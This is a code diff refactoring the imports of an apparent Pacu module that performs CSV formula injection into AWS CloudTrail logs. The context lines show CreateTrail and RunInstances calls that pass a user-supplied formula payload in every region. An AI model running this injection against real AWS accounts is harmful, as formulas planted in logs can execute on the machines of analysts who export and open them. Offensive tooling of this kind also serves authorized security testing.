@@ -2,6 +2,9 @@
 import argparse
 from botocore.exceptions import ClientError
 
+from pacu.aws import get_boto3_client, get_regions
+from pacu.io import print
+
 module_info = {
     # Name of the module (should be the same as the filename)
     'name': 'cloudtrail__csv_injection',
@@ -37,8 +40,6 @@ parser.add_argument('--payload', required=True, help='The formula payload to use
 def main(args, pacu_main):
     ###### Don't modify these. They can be removed if you are not using the function.
     args = parser.parse_args(args)
-    print = pacu_main.print
-    get_regions = pacu_main.get_regions
     ######
 
     summary_data = {'success': 0, 'fails': 0}
@@ -50,7 +51,7 @@ def main(args, pacu_main):
     for region in regions:
         print('Starting region {}...'.format(region))
         print('  Starting CreateTrail attack...')
-        client = pacu_main.get_boto3_client('cloudtrail', region)
+        client = get_boto3_client('cloudtrail', region)
         try:
             client.create_trail(
                 Name=args.payload,
@@ -75,7 +76,7 @@ def main(args, pacu_main):
                     print('    ' + str(code))
 
         print('  Starting RunInstances attack...')
-        client = pacu_main.get_boto3_client('ec2', region)
+        client = get_boto3_client('ec2', region)
         try:
             client.run_instances(
                 ImageId=args.payload,
